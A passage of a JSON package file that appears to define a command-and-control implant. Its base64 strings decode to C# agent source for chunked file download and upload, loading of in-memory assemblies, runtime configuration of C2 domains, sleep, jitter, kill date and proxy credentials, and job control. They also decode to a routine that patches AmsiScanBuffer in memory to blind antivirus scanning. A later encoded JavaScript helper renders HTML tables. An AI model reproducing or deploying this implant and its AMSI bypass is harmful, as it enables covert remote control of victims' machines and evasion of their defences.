lYWs7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG91dHB1dDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIG91dHB1dDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIEdldEFzc2VtYmx5KExpc3Q8c3RyaW5nPiBDaHVua3MsIGludCBUb3RhbENodW5rcykNCiAgICAgICAgew0KICAgICAgICAgICAgYnl0ZVtdIEZpbmFsQXNzZW1ibHkgPSBuZXcgYnl0ZVtdIHsgfTsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGJ5dGVbXVtdIEFzc2VtYmx5QXJyYXkgPSBuZXcgYnl0ZVtUb3RhbENodW5rc11bXTsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChzdHJpbmcgY2h1bmsgaW4gQ2h1bmtzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaW50IGluZGV4ID0gQ2h1bmtzLkluZGV4T2YoY2h1bmspOw0KICAgICAgICAgICAgICAgICAgICBBc3NlbWJseUFycmF5W2luZGV4XSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhjaHVuayk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIEZpbmFsQXNzZW1ibHkgPSBDb21iaW5lKEFzc2VtYmx5QXJyYXkpOw0KICAgICAgICAgICAgICAgIHJldHVybiBGaW5hbEFzc2VtYmx5Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gRmluYWxBc3NlbWJseTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIENvbWJpbmUocGFyYW1zIGJ5dGVbXVtdIGFycmF5cykNCiAgICAgICAgew0KICAgICAgICAgICAgYnl0ZVtdIHJ2ID0gbmV3IGJ5dGVbYXJyYXlzLlN1bShhID0+IGEuTGVuZ3RoKV07DQogICAgICAgICAgICBpbnQgb2Zmc2V0ID0gMDsNCiAgICAgICAgICAgIGZvcmVhY2ggKGJ5dGVbXSBhcnJheSBpbiBhcnJheXMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQnVmZmVyLkJsb2NrQ29weShhcnJheSwgMCwgcnYsIG9mZnNldCwgYXJyYXkuTGVuZ3RoKTsNCiAgICAgICAgICAgICAgICBvZmZzZXQgKz0gYXJyYXkuTGVuZ3RoOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHJ2Ow0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBjbGFzcyBEb3dubG9hZA0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHVsb25nIEdldFRvdGFsQ2h1bmtzKHN0cmluZyBGaWxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBmaSA9IG5ldyBGaWxlSW5mbyhGaWxlKTsNCiAgICAgICAgICAgICAgICB1bG9uZyB0b3RhbF9jaHVua3MgPSAodWxvbmcpKGZpLkxlbmd0aCArIENvbmZpZy5DaHVua1NpemUgLSAxKSAvIENvbmZpZy5DaHVua1NpemU7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRvdGFsX2NodW5rczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBsb25nIEdldEZpbGVTaXplKHN0cmluZyBGaWxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBmaSA9IG5ldyBGaWxlSW5mbyhGaWxlKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmkuTGVuZ3RoOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRQYXRoKHN0cmluZyBGaWxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBQYXRoLkdldEZ1bGxQYXRoKEZpbGUpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRDaHVuayhzdHJpbmcgRmlsZSwgaW50IENodW5rTnVtLCBpbnQgVG90YWxDaHVua3MsIGxvbmcgRmlsZVNpemUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBieXRlW10gZmlsZV9jaHVuayA9IG51bGw7DQogICAgICAgICAgICAgICAgICAgIGxvbmcgcG9zID0gQ2h1bmtOdW0gKiBDb25maWcuQ2h1bmtTaXplOw0KICAgICAgICAgICAgICAgICAgICB1c2luZyAoRmlsZVN0cmVhbSBmaWxlU3RyZWFtID0gbmV3IEZpbGVTdHJlYW0oRmlsZSwgRmlsZU1vZGUuT3BlbikpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVTdHJlYW0uUG9zaXRpb24gPSBwb3M7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoVG90YWxDaHVua3MgPT0gQ2h1bmtOdW0gKyAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfY2h1bmsgPSBuZXcgYnl0ZVtGaWxlU2l6ZSAtIChDaHVua051bSAqIENvbmZpZy5DaHVua1NpemUpXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IGZpbGVfY2h1bmsuTGVuZ3RoOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVTdHJlYW0uUmVhZChmaWxlX2NodW5rLCAwLCBjaHVua19zaXplKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2NodW5rID0gbmV3IGJ5dGVbQ29uZmlnLkNodW5rU2l6ZV07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZVN0cmVhbS5SZWFkKGZpbGVfY2h1bmssIDAsIENvbmZpZy5DaHVua1NpemUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKGZpbGVfY2h1bmspOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJFcnJvciByZWFkaW5nIGZpbGUiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBVcGxvYWQoc3RyaW5nIEZpbGUsIHN0cmluZyBDaHVua0RhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGJ5dGVbXSBjaHVua19kYXRhID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENodW5rRGF0YSk7DQogICAgICAgICAgICAgICAgdXNpbmcgKEZpbGVTdHJlYW0gZmlsZVN0cmVhbSA9IG5ldyBGaWxlU3RyZWFtKEZpbGUsIEZpbGVNb2RlLkFwcGVuZCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBmaWxlU3RyZWFtLldyaXRlKGNodW5rX2RhdGEsIDAsIGNodW5rX2RhdGEuTGVuZ3RoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBTZXRDb25maWcoc3RyaW5nIGFyZykNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nW10gYXJncyA9IGFyZy5TcGxpdCgpOw0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3dpdGNoIChhcmdzWzBdLlRvU3RyaW5nKCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjYXNlICJkb21haW4iOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoYXJnc1sxXSA9PSAiYWRkIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5TZXJ2ZXIgc2VydmVyID0gbmV3IFV0aWxzLlNlcnZlcg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9tYWluID0gYXJnc1syXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY291bnQgPSAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuU2VydmVycy5BZGQoc2VydmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKGFyZ3NbMV0gPT0gInJlbW92ZSIpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKENvbmZpZy5TZXJ2ZXJzLkNvdW50ID09IDEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuU2VydmVyIHNlcnZlciBpbiBDb25maWcuU2VydmVycykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNlcnZlci5kb21haW4gPT0gYXJnc1syXSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuU2VydmVycy5SZW1vdmUoc2VydmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNhc2UgInNsZWVwIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5TbGVlcCA9IGludC5QYXJzZShhcmdzWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJqaXR0ZXIiOg0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkppdHRlciA9IGludC5QYXJzZShhcmdzWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJraWxsX2RhdGUiOg0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLktpbGxEYXRlID0gYXJnc1sxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJob3N0X2hlYWRlciI6DQogICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuSG9zdEhlYWRlciA9IGFyZ3NbMV07DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAidXNlcl9hZ2VudCI6DQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgdWEgPSBzdHJpbmcuSm9pbigiICIsIGFyZ3MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlVzZXJBZ2VudCA9IHVhLlN1YnN0cmluZygxMSk7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAicGFyYW0iOg0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlBhcmFtID0gYXJnc1sxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJwcm94eSI6DQogICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKGFyZ3NbMV0pDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidXNlX2RlZmF1bHQiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoYXJnc1syXS5Ub0xvd2VyKCkgPT0gImZhbHNlIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkRlZmF1bHRQcm94eSA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkRlZmF1bHRQcm94eSA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiYWRkcmVzcyI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Qcm94eUFkZHJlc3MgPSBhcmdzWzJdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJ1c2VybmFtZSI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Qcm94eVVzZXIgPSBhcmdzWzJdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJwYXNzd29yZCI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Qcm94eVBhc3N3b3JkID0gYXJnc1syXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbHBGaWxlTmFtZSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQW5zaSwgRXhhY3RTcGVsbGluZyA9IHRydWUsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7DQoNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBQYXRjaEJ1ZmZlcigpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBwYXRjaDsNCiAgICAgICAgICAgIGlmIChJbnRQdHIuU2l6ZSA9PSA4KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHBhdGNoID0gbmV3IGJ5dGVbNl07DQogICAgICAgICAgICAgICAgcGF0Y2hbMF0gPSAweEI4Ow0KICAgICAgICAgICAgICAgIHBhdGNoWzFdID0gMHg1NzsNCiAgICAgICAgICAgICAgICBwYXRjaFsyXSA9IDB4MDA7DQogICAgICAgICAgICAgICAgcGF0Y2hbM10gPSAweDA3Ow0KICAgICAgICAgICAgICAgIHBhdGNoWzRdID0gMHg4MDsNCiAgICAgICAgICAgICAgICBwYXRjaFs1XSA9IDB4YzM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcGF0Y2ggPSBuZXcgYnl0ZVs4XTsNCiAgICAgICAgICAgICAgICBwYXRjaFswXSA9IDB4Qjg7DQogICAgICAgICAgICAgICAgcGF0Y2hbMV0gPSAweDU3Ow0KICAgICAgICAgICAgICAgIHBhdGNoWzJdID0gMHgwMDsNCiAgICAgICAgICAgICAgICBwYXRjaFszXSA9IDB4MDc7DQogICAgICAgICAgICAgICAgcGF0Y2hbNF0gPSAweDgwOw0KICAgICAgICAgICAgICAgIHBhdGNoWzVdID0gMHhjMjsNCiAgICAgICAgICAgICAgICBwYXRjaFs2XSA9IDB4MTg7DQogICAgICAgICAgICAgICAgcGF0Y2hbN10gPSAweDAwOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgbGlicmFyeSA9IExvYWRMaWJyYXJ5KCJhbXNpLmRsbCIpOw0KICAgICAgICAgICAgICAgIHZhciBhZGRyZXNzID0gR2V0UHJvY0FkZHJlc3MobGlicmFyeSwgIkFtc2lTY2FuQnVmZmVyIik7DQogICAgICAgICAgICAgICAgdWludCBvbGRQcm90ZWN0Ow0KICAgICAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KGFkZHJlc3MsIChVSW50UHRyKXBhdGNoLkxlbmd0aCwgMHg0MCwgb3V0IG9sZFByb3RlY3QpOw0KICAgICAgICAgICAgICAgIE1hcnNoYWwuQ29weShwYXRjaCwgMCwgYWRkcmVzcywgcGF0Y2guTGVuZ3RoKTsNCiAgICAgICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChhZGRyZXNzLCAoVUludFB0cilwYXRjaC5MZW5ndGgsIG9sZFByb3RlY3QsIG91dCBvbGRQcm90ZWN0KTsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0Q29ubmVjdEZhaWxzKCkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIGF0dGVtcHRzID0gIiI7DQogICAgICAgICAgICBmb3JlYWNoIChVdGlscy5TZXJ2ZXIgc2VydmVyIGluIENvbmZpZy5TZXJ2ZXJzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGF0dGVtcHRzICs9IFN0cmluZy5Gb3JtYXQoInswfSA9IHsxfSwgIiwgc2VydmVyLmRvbWFpbiwgc2VydmVyLmNvdW50LlRvU3RyaW5nKCkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGF0dGVtcHRzOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0Q29uZmlnKCkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIHNlcnZlcnMgPSAiIjsNCiAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLlNlcnZlciBzZXJ2ZXIgaW4gQ29uZmlnLlNlcnZlcnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc2VydmVycyArPSBTdHJpbmcuRm9ybWF0KCJ7MH0gIiwgc2VydmVyLmRvbWFpbik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgiRG9tYWluczogezB9XG5TbGVlcDogezF9XG5KaXR0ZXI6IHsyfVxuS2lsbCBEYXRlOiB7M31cbkhvc3QgSGVhZGVyOiB7NH1cblVzZXItQWdlbnQ6IHs1fVxuR0VUIFBhcmFtZXRlcjogezZ9XG5Vc2UgRGVmYXVsdCBQcm94eTogezd9XG5Qcm94eSBBZGRyZXNzOiB7OH1cblByb3h5IFVzZXJuYW1lOiB7OX1cblByb3h5IFBhc3N3b3JkOiB7MTB9XG5GYWlsZWQgQ29ubmVjdGlvbnM6IHsxMX0iLCBzZXJ2ZXJzLCBDb25maWcuU2xlZXAuVG9TdHJpbmcoKSwgQ29uZmlnLkppdHRlci5Ub1N0cmluZygpLCBDb25maWcuS2lsbERhdGUsIENvbmZpZy5Ib3N0SGVhZGVyLCBDb25maWcuVXNlckFnZW50LCBDb25maWcuUGFyYW0sIENvbmZpZy5EZWZhdWx0UHJveHksIENvbmZpZy5Qcm94eUFkZHJlc3MsIENvbmZpZy5Qcm94eVVzZXIsIENvbmZpZy5Qcm94eVBhc3N3b3JkLCBHZXRDb25uZWN0RmFpbHMoKSk7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgS2lsbEpvYihVdGlscy5Kb2JMaXN0IGpvYkxpc3QsIGludCBqb2JOdW0pDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGludCBjb3VudCA9IDA7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuSm9iIGpvYiBpbiBqb2JMaXN0LmpvYnMpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoam9iLmpvYl9pZCA9PSBqb2JOdW0pDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGpvYkxpc3Quam9ic1tqb2JOdW1dLnRocmVhZC5BYm9ydCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgam9iTGlzdC5qb2JzLlJlbW92ZUF0KGNvdW50KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNvdW50Kys7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRKb2JzKFV0aWxzLkpvYkxpc3Qgam9iTGlzdCkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIGpvYnMgPSAiSm9iIElEXHRUYXNrIElEXHRcdFx0XHRcdENvbW1hbmRcdFx0UGFyYW1ldGVyc1xuLS0tLS0tXHQtLS0tLS0tXHRcdFx0XHRcdC0tLS0tLS1cdFx0LS0tLS0tLS0tXG4iOw0KICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuSm9iIGpvYiBpbiBqb2JMaXN0LmpvYnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgam9icyArPSBTdHJpbmcuRm9ybWF0KCJ7MH1cdHsxfVx0ezJ9XHRcdHszfVxuIiwgam9iLmpvYl9pZCwgam9iLnRhc2tfaWQsIGpvYi5jb21tYW5kLCBqb2IucGFyYW1ldGVycy5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGpvYnM7DQogICAgICAgIH0NCiAgICB9DQp9DQo="
        },
        {
          "Uuid.txt": "VVVJRF9IRVJF"
        }
      ],
      "support_scripts": [
        {
          "name": "create_table",
          "script": "ZnVuY3Rpb24oaGVhZGVycywgZGF0YSl7CiAgdmFyIG91dHB1dCA9ICI8dGFibGUgc3R5bGU9J292ZXJmbG93OnNjcm9sbDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MTAwJTtjb2xvcjp3aGl0ZScgY2xhc3M9J3RhYmxlLXN0cmlwZWQgdGFibGUtaG92ZXIgYm9yZGVyIGJvcmRlci1kYXJrIHNoYWRvdyB0YWJsZS1jb25kZW5zZWQgdGFibGUtZGFyayc+IjsKICBvdXRwdXQgKz0gIjx0cj4iOwogIGZvcih2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgaSsrKXsKICAgIG91dHB1dCArPSAiPHRoIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiMzOTM0ODU7Y29sb3I6d2hpdGU7aGVpZ2h0OjQwcHg7dGV4dC1hbGlnbjpsZWZ0O3BhZGRpbmc6MHB4IDBweCAwcHggMjBweDt3aWR0aDoiICsgaGVhZGVyc1tpXVsnc2l6ZSddICsgIicgb25jbGljaz1cInNvcnRfdGFibGUodGhpcylcIj4iICsgaGVhZGVyc1tpXVsnbmFtZSddLnRvVXBwZXJDYXNlKCkgKyAiPC90aD4iOwogIH0KICBvdXRwdXQgKz0gIjwvdHI+IjsKICBmb3IodmFyIGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKyl7CiAgICBvdXRwdXQgKz0gIjx0ciBzdHlsZT0ndGV4dC1hbGlnbjpsZWZ0OyIgKyBkYXRhW2ldWydyb3ctc3R5bGUnXSArICInPiI7CiAgICBmb3IodmFyIGogPSAwOyBqIDwgaGVhZGVycy5sZW5ndGg7IGorKyl7CiAgICAgaWYoZGF0YVtpXVsnY2VsbC1zdHlsZSddLmhhc093blByb3BlcnR5KGhlYWRlcnNbal0pKXsKICAgICAgICBvdXRwdXQgKz0gIjx0ZCBzdHlsZT0ncGFkZGluZzowcHggMHB4IDBweCAyMHB4OyIgKyBkYXRhW2ldWydjZWxsLXN0eWxlJ11baGVhZGVyc1tqXVsnbmFtZSddXSArICInPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgICBlbHNlewogICAgICAgIG91dHB1dCArPSAiPHRkIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDIwcHgnPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgIH0KICAgIG91dHB1dCArPSAiPC90cj4iOwogIH0KICBvdXRwdXQgKz0gIjwvdGFibGU+IjsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "name": "collapsable",
